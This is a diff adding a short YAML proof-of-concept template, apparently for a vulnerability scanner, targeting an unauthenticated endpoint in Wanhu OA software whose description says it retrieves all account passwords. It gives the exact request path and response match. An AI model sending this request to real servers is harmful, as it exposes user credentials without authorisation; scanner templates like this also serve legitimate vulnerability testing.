@@ -1,0 +1,9 @@
+name: poc-yaml-万户OA-unatuh
+description: "万户OA获取所有账户密码"
+method: GET
+path:
+  - /defaultroot/evoInterfaceServlet?paramType=user
+expression:
+  status: 200
+  body_any:
+    - "userList"
